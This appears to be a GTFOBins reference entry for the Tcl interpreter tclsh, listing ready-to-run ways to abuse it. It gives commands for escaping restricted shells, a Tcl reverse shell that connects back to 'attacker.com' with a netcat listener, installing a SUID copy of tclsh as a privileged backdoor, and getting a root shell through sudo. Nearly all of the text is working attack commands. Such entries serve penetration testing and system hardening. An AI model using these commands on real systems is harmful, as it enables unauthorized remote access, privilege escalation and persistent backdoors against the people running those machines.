# GTFOBin: tclsh

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```

## Non-interactive reverse shell

It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which tclsh) .

./tclsh
exec /bin/sh -p <@stdin >@stdout 2>@stderr
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr
```
